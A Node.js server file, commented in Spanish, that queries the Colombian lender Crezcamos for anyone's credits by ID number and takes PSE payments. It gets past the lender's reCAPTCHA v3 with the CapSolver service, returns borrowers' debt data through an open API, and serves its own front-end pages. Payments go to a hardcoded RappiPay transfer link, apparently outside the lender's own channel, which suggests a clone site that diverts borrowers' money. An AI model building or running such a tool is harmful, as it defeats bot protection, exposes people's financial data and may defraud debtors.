/**
 * Crezcamos - Consulta de Créditos + Pago PSE
 *
 * Estrategia: CapSolver para reCAPTCHA v3
 *   - Usa servicio externo para resolver captcha con score alto
 *   - Sin Playwright, sin browser, más rápido y confiable
 *   - Reintentos automáticos
 *
 * ─── Variables de entorno ───────────────────────────────────
 *   CAPSOLVER_API_KEY=tu-api-key  (requerido)
 *   PORT=3000                      (opcional)
 *
 * ─── Uso ────────────────────────────────────────────────────
 *   node server.js
 *   Abrir http://localhost:3000
 */

const http = require('http');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const CAPSOLVER_API_KEY = process.env.CAPSOLVER_API_KEY || '';
const API_BASE = 'https://analizamos.crezcamos.com:8440/pagos/api/public';
const CREZCAMOS_URL = 'https://transacciones.crezcamos.com/';
const RECAPTCHA_SITEKEY = '6LcN3IYfAAAAAHN_LIcvvuewvEcrUwoGGr7hVuf8';

// ─── Tipos de documento (UUIDs del backend) ──────────────────
const TIPO_DOC_IDS = {
  CC:  'F18AFF61-F19C-42B7-8F24-3024C44BF911',
  CE:  'A13891A5-E949-4A9B-8F67-5B0E4C3CFC8E',
  NIT: '60C721B6-D691-48B0-B712-E54B4E7D03B2',
  PEP: '3E4F52A0-7C13-4E12-B8D5-C45F2B1A9D7F',
  PPT: 'D82A1F3B-9E56-4C01-A2E7-8F3B6D0C5E91',
};

// ─── RappiPay PSE Config ────────────────────────────────────
const RAPPIPAY_API = 'https://services.prod-k8s.rappipay.com/integration/pse/api';
const RAPPIPAY_LINK_CODE = 's5sqzI';
const FIREBASE_API_KEY = 'AIzaSyBXJ_5dpN6uTDr41m72dcS_ZKJtGc_dVHw';
const FIREBASE_DB_URL = 'https://rpp-platform-mobile-app-prod-default-rtdb.firebaseio.com';

// ─── API POST helper (Crezcamos) ────────────────────────────
function apiPost(ruta, body, headers = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(`${API_BASE}${ruta}`);
    const data = JSON.stringify(body);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Content-Length': Buffer.byteLength(data),
        ...headers,
      },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve({ status: res.statusCode, data: JSON.parse(body) }); }
        catch { resolve({ status: res.statusCode, data: body }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

// ─── HTTPS GET helper ──────────────────────────────────────
function httpsGet(urlStr) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'GET',
      headers: { 'Accept': 'application/json' },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

// ─── HTTPS POST helper ────────────────────────────────────
function httpsPost(urlStr, data) {
  return new Promise((resolve, reject) => {
    const url = new URL(urlStr);
    const payload = JSON.stringify(data);
    const opts = {
      hostname: url.hostname,
      port: url.port || 443,
      path: url.pathname + url.search,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'Content-Length': Buffer.byteLength(payload),
      },
    };
    const req = https.request(opts, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { resolve(body); }
      });
    });
    req.on('error', reject);
    req.write(payload);
    req.end();
  });
}

// ═══════════════════════════════════════════════════════════════
// CAPSOLVER - Resolver reCAPTCHA v3 con score alto
// ═══════════════════════════════════════════════════════════════

async function obtenerToken() {
  if (!CAPSOLVER_API_KEY) {
    throw new Error('CAPSOLVER_API_KEY no configurado. Agrégalo en las variables de entorno de Render.');
  }

  console.log('[captcha] Solicitando token a CapSolver...');

  // 1. Crear tarea
  const createResp = await httpsPost('https://api.capsolver.com/createTask', {
    clientKey: CAPSOLVER_API_KEY,
    task: {
      type: 'ReCaptchaV3TaskProxyLess',
      websiteURL: CREZCAMOS_URL,
      websiteKey: RECAPTCHA_SITEKEY,
      pageAction: 'sesion',
      minScore: 0.7,
    },
  });

  if (createResp.errorId && createResp.errorId !== 0) {
    throw new Error(`CapSolver createTask error: ${createResp.errorDescription || createResp.errorCode || JSON.stringify(createResp)}`);
  }

  const taskId = createResp.taskId;
  if (!taskId) {
    throw new Error('CapSolver no devolvió taskId: ' + JSON.stringify(createResp));
  }

  console.log('[captcha] Task creada:', taskId);

  // 2. Esperar resultado (poll)
  const MAX_POLLS = 30;
  for (let i = 0; i < MAX_POLLS; i++) {
    await new Promise(r => setTimeout(r, 2000));

    const result = await httpsPost('https://api.capsolver.com/getTaskResult', {
      clientKey: CAPSOLVER_API_KEY,
      taskId: taskId,
    });

    if (result.status === 'ready') {
      const token = result.solution?.gRecaptchaResponse;
      if (token) {
        console.log('[captcha] Token obtenido ✓ (largo:', token.length, ')');
        return token;
      }
      throw new Error('CapSolver ready pero sin token: ' + JSON.stringify(result));
    }

    if (result.errorId && result.errorId !== 0) {
      throw new Error(`CapSolver error: ${result.errorDescription || result.errorCode}`);
    }

    // Sigue procesando...
  }

  throw new Error('CapSolver timeout: no se obtuvo token después de ' + MAX_POLLS + ' intentos');
}

// ─── AES-256-GCM cifrar/descifrar ───────────────────────────
function cifrarAES(aesKey, datos) {
  const textoPlano = JSON.stringify(datos);
  const nonce = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', aesKey, nonce);
  const encrypted = Buffer.concat([cipher.update(textoPlano, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([nonce, encrypted, tag]).toString('base64');
}

function descifrarAES(aesKey, payloadBase64) {
  const buf = Buffer.from(payloadBase64, 'base64');
  const nonce = buf.subarray(0, 12);
  const tag = buf.subarray(buf.length - 16);
  const ciphertext = buf.subarray(12, buf.length - 16);
  const decipher = crypto.createDecipheriv('aes-256-gcm', aesKey, nonce);
  decipher.setAuthTag(tag);
  const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return JSON.parse(decrypted.toString('utf8'));
}

// ─── Crear sesión (con reintentos) ──────────────────────────
const MAX_REINTENTOS = 3;

async function crearSesion() {
  let lastError;
  for (let intento = 1; intento <= MAX_REINTENTOS; intento++) {
    try {
      const captchaToken = await obtenerToken();

      console.log(`[sesion] Intento ${intento}/${MAX_REINTENTOS} — Iniciando sesión...`);
      const initRes = await apiPost('/sesion/iniciar', { captchaToken });
      console.log('[sesion] /sesion/iniciar →', initRes.status);

      if (initRes.status !== 200 || !initRes.data?.sessionId) {
        throw new Error(`Fallo sesión (${initRes.status}): ${JSON.stringify(initRes.data)}`);
      }

      const { sessionId, clavePublicaRSA } = initRes.data;
      console.log('[sesion] sessionId:', sessionId);

      const aesKey = crypto.randomBytes(32);
      const rsaPubDer = Buffer.from(clavePublicaRSA, 'base64');
      const rsaPubPem =
        '-----BEGIN PUBLIC KEY-----\n' +
        rsaPubDer.toString('base64').match(/.{1,64}/g).join('\n') +
        '\n-----END PUBLIC KEY-----';

      const claveAESCifrada = crypto.publicEncrypt(
        { key: rsaPubPem, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: 'sha256' },
        aesKey
      );

      const exchRes = await apiPost(
        '/sesion/intercambio-clave',
        { claveAESCifrada: claveAESCifrada.toString('base64') },
        { 'X-Sesion-Pagos': sessionId }
      );
      console.log('[sesion] /intercambio-clave →', exchRes.status);

      if (exchRes.status !== 200) {
        throw new Error(`Fallo intercambio (${exchRes.status}): ${JSON.stringify(exchRes.data)}`);
      }

      console.log('[sesion] Sesión lista ✓');
      return { sessionId, aesKey };

    } catch (err) {
      lastError = err;
      const esLowScore = err.message.includes('CAPTCHA_LOW_SCORE') || err.message.includes('CAPTCHA_INVALIDO');
      if (esLowScore && intento < MAX_REINTENTOS) {
        console.log(`[sesion] ⚠ ${err.message.includes('LOW_SCORE') ? 'LOW_SCORE' : 'INVALIDO'} intento ${intento}/${MAX_REINTENTOS}, reintentando...`);
        await new Promise(r => setTimeout(r, 1000));
        continue;
      }
      throw err;
    }
  }
  throw lastError;
}

// ─── Consultar créditos ─────────────────────────────────────
async function consultarCreditos(tipoDoc, numDoc) {
  const t0 = Date.now();
  const { sessionId, aesKey } = await crearSesion();
  const hdrs = { 'X-Sesion-Pagos': sessionId };

  const idTipoDoc = TIPO_DOC_IDS[tipoDoc.toUpperCase()] || TIPO_DOC_IDS.CC;
  const validarBody = {
    numeroDocumento: numDoc,
    idTipoDocumento: idTipoDoc,
  };
  console.log(`[api] Validando PSE... (tipo=${tipoDoc}, doc=${numDoc})`);
  const valRes = await apiPost('/pse/validar', { payload: cifrarAES(aesKey, validarBody) }, hdrs);
  console.log('[api] /pse/validar →', valRes.status);

  let validarData = null;
  if (valRes.status === 200 && valRes.data?.payload) {
    try { validarData = descifrarAES(aesKey, valRes.data.payload); } catch (e) {
      console.log('[api] Error descifrando validar:', e.message);
    }
  }
  console.log('[api] validarData:', JSON.stringify(validarData, null, 2));

  const consultarBody = {
    idDocument: numDoc,
    creditNumber: '',
    app: '',
    flagConsolidated: '',
    codigo: '',
  };
  console.log('[api] Consultando créditos...');
  const conRes = await apiPost('/consultar-creditos', { payload: cifrarAES(aesKey, consultarBody) }, hdrs);
  console.log('[api] /consultar-creditos →', conRes.status);

  let creditosData = null;
  if (conRes.status === 200 && conRes.data?.payload) {
    try { creditosData = descifrarAES(aesKey, conRes.data.payload); } catch (e) {
      console.log('[api] Error descifrando créditos:', e.message);
    }
  }
  console.log('[api] creditosData:', JSON.stringify(creditosData, null, 2));

  // Normalizar respuesta
  let creditos = [];
  if (creditosData) {
    if (Array.isArray(creditosData)) {
      creditos = creditosData;
    } else if (typeof creditosData === 'object') {
      for (const key of Object.keys(creditosData)) {
        if (Array.isArray(creditosData[key]) && creditosData[key].length > 0) {
          creditos = creditosData[key];
          console.log(`[api] Créditos en campo: "${key}" (${creditos.length} items)`);
          break;
        }
      }
      if (creditos.length === 0 && Object.keys(creditosData).length > 0) {
        creditos = [creditosData];
      }
    }
  }

  creditos.forEach((c, i) => console.log(`[api] Crédito ${i}:`, JSON.stringify(c)));
  const elapsed = Date.now() - t0;
  console.log(`[api] Consulta completada en ${elapsed}ms`);

  return {
    ok: creditos.length > 0,
    error: creditos.length === 0 ? 'No se encontraron créditos para este documento' : undefined,
    tiempoMs: elapsed,
    consulta: { tipoDocumento: tipoDoc, numeroDocumento: numDoc },
    creditos: creditos,
  };
}

// ─── HTTP Server ─────────────────────────────────────────────
function sendJSON(res, status, obj) {
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
  });
  res.end(JSON.stringify(obj, null, 2));
}

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
  '.js': 'application/javascript', '.png': 'image/png',
  '.jpg': 'image/jpeg', '.svg': 'image/svg+xml', '.ico': 'image/x-icon',
};

const server = http.createServer(async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') { res.writeHead(204); return res.end(); }

  const url = new URL(req.url, `http://localhost:${PORT}`);

  // ─── Servir index.html ───
  if (url.pathname === '/' && req.method === 'GET') {
    try {
      const html = fs.readFileSync(path.join(__dirname, 'index.html'), 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(html);
    } catch { return sendJSON(res, 500, { error: 'index.html no encontrado' }); }
  }

  // ─── Servir archivos estáticos (imágenes, etc) ───
  if (req.method === 'GET' && !url.pathname.startsWith('/consultar') && !url.pathname.startsWith('/pse/')) {
    const safePath = path.normalize(url.pathname).replace(/^(\.\.(\/|\\|$))+/, '');
    const filePath = path.join(__dirname, safePath);
    const ext = path.extname(filePath).toLowerCase();
    const mime = MIME_TYPES[ext];
    if (mime && fs.existsSync(filePath)) {
      res.writeHead(200, { 'Content-Type': mime });
      return res.end(fs.readFileSync(filePath));
    }
  }

  // ─── Consultar créditos ───
  if (url.pathname === '/consultar') {
    let tipo, doc;
    if (req.method === 'GET') {
      tipo = url.searchParams.get('tipo') || 'CC';
      doc = url.searchParams.get('doc');
    } else if (req.method === 'POST') {
      const raw = await new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
      try { ({ tipo = 'CC', doc } = JSON.parse(raw)); } catch { return sendJSON(res, 400, { error: 'JSON inválido' }); }
    } else {
      return sendJSON(res, 405, { error: 'Método no permitido' });
    }

    if (!doc) return sendJSON(res, 400, { error: 'Parámetro "doc" requerido' });

    console.log(`\n${'═'.repeat(50)}`);
    console.log(`Consulta: tipo=${tipo} doc=${doc}`);
    console.log('═'.repeat(50));

    try {
      const result = await consultarCreditos(tipo, doc);
      return sendJSON(res, 200, result);
    } catch (err) {
      console.error('[error]', err.message);
      return sendJSON(res, 500, { ok: false, error: err.message });
    }
  }

  // ═══════════════════════════════════════════════════════════
  // RAPPIPAY PSE - Endpoints de pago
  // ═══════════════════════════════════════════════════════════

  // ─── GET /pse/bancos ─────────────────────────────────────
  if (url.pathname === '/pse/bancos' && req.method === 'GET') {
    try {
      console.log('[pse] Obteniendo bancos...');
      const linkData = await httpsGet(`${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`);
      const bancos = linkData.banks || [];
      console.log(`[pse] ${bancos.length} bancos obtenidos`);
      return sendJSON(res, 200, { ok: true, bancos });
    } catch (err) {
      console.error('[pse] Error bancos:', err.message);
      return sendJSON(res, 500, { ok: false, error: 'Error obteniendo bancos: ' + err.message });
    }
  }

  // ─── POST /pse/pagar ─────────────────────────────────────
  if (url.pathname === '/pse/pagar' && req.method === 'POST') {
    const raw = await new Promise((r) => { let d = ''; req.on('data', (c) => (d += c)); req.on('end', () => r(d)); });
    let body;
    try { body = JSON.parse(raw); } catch { return sendJSON(res, 400, { ok: false, error: 'JSON inválido' }); }

    const { bank_code, bank_name, document_type, document_number, amount, email, phone, credit_number } = body;

    if (!bank_code || !document_number || !amount) {
      return sendJSON(res, 400, { ok: false, error: 'Faltan campos requeridos' });
    }

    try {
      console.log(`[pse] Iniciando pago: banco=${bank_code}, doc=${document_number}, monto=${amount}`);

      // 1. Obtener transfer-link para traceability_id
      const linkData = await httpsGet(`${RAPPIPAY_API}/transfer-link/code/${RAPPIPAY_LINK_CODE}`);

      if (linkData.status !== 'CREATED') {
        return sendJSON(res, 400, { ok: false, error: 'Link de pago no disponible (status: ' + linkData.status + ')' });
      }

      const traceability_id = linkData.traceability_id;
      console.log('[pse] traceability_id:', traceability_id);

      // Validar monto
      const minAmount = linkData.min_amount || 10000;
      const maxAmount = linkData.max_amount || 20000000;
      if (amount < minAmount || amount > maxAmount) {
        return sendJSON(res, 400, { ok: false, error: `Monto debe estar entre $${minAmount.toLocaleString()} y $${maxAmount.toLocaleString()}` });
      }

      // 2. Obtener IP del cliente
      const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '127.0.0.1';

      // 3. POST payment-url
      const paymentBody = {
        traceability_id,
        bank_code,
        bank_name,
        document_type: document_type === 'CC' ? 'CC' : document_type,
        document_number: String(document_number),
        amount: Number(amount),
        user_agreement_check: true,
        client_ip: clientIp,
      };

      console.log('[pse] POST /payment-url...');
      const paymentResp = await httpsPost(`${RAPPIPAY_API}/payment-url`, paymentBody);
      console.log('[pse] payment-url response:', JSON.stringify(paymentResp));

      if (!paymentResp.token) {
        return sendJSON(res, 500, { ok: false, error: 'No se recibió token de pago' });
      }

      // 4. Firebase: signInWithCustomToken
      console.log('[pse] Firebase signIn...');
      const firebaseAuth = await httpsPost(
        `https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=${FIREBASE_API_KEY}`,
        { token: paymentResp.token, returnSecureToken: true }
      );

      if (!firebaseAuth.idToken) {
        return sendJSON(res, 500, { ok: false, error: 'Error autenticación Firebase' });
      }

      const idToken = firebaseAuth.idToken;
      console.log('[pse] Firebase auth OK');

      // 5. Poll Firebase RTDB para obtener bank URL
      const firebasePath = `cash_flow_cash_in_pse_link_transaction/${traceability_id}.json?auth=${idToken}`;
      let bankUrl = null;
      const MAX_POLLS = 15;

      for (let i = 0; i < MAX_POLLS; i++) {
        await new Promise(r => setTimeout(r, 2000));
        console.log(`[pse] Poll ${i + 1}/${MAX_POLLS}...`);

        try {
          const fbData = await httpsGet(`${FIREBASE_DB_URL}/${firebasePath}`);
          if (fbData && fbData.data && fbData.data.params && fbData.data.params.link) {
            bankUrl = fbData.data.params.link;
            console.log('[pse] Bank URL obtenida:', bankUrl);
            break;
          }
          if (fbData && fbData.params && fbData.params.link) {
            bankUrl = fbData.params.link;
            console.log('[pse] Bank URL obtenida (alt):', bankUrl);
            break;
          }
        } catch (pollErr) {
          console.log(`[pse] Poll error: ${pollErr.message}`);
        }
      }

      if (!bankUrl) {
        return sendJSON(res, 500, { ok: false, error: 'No se pudo obtener la URL del banco. Intenta de nuevo.' });
      }

      return sendJSON(res, 200, { ok: true, bank_url: bankUrl, traceability_id });

    } catch (err) {
      console.error('[pse] Error pago:', err.message);
      return sendJSON(res, 500, { ok: false, error: 'Error procesando pago: ' + err.message });
    }
  }

  // ─── Servir pago.html ───
  if (url.pathname === '/pago.html' && req.method === 'GET') {
    try {
      const html = fs.readFileSync(path.join(__dirname, 'pago.html'), 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return res.end(html);
    } catch { return sendJSON(res, 500, { error: 'pago.html no encontrado' }); }
  }

  sendJSON(res, 404, { error: 'Ruta no encontrada' });
});

// ─── Arranque ───────────────────────────────────────────────
server.listen(PORT, () => {
  console.log(`
╔═══════════════════════════════════════════════════════════╗
║  Crezcamos - Consulta de Créditos + Pago PSE             ║
║  http://localhost:${PORT}                                    ║
║                                                           ║
║  ★ CapSolver para reCAPTCHA (score alto siempre)         ║
║  ★ Sin Playwright — más rápido y liviano                 ║
║  ★ RappiPay PSE integrado                                ║
║                                                           ║
║  Frontend: http://localhost:${PORT}/                         ║
║  API:      GET /consultar?tipo=CC&doc=NUMERO              ║
║  Bancos:   GET /pse/bancos                                ║
║  Pagar:    POST /pse/pagar                                ║
╚═══════════════════════════════════════════════════════════╝
  `);

  if (!CAPSOLVER_API_KEY) {
    console.log('⚠️  CAPSOLVER_API_KEY no está configurado!');
    console.log('   Agrega la variable de entorno en Render.');
    console.log('   Regístrate en https://www.capsolver.com');
  }
});
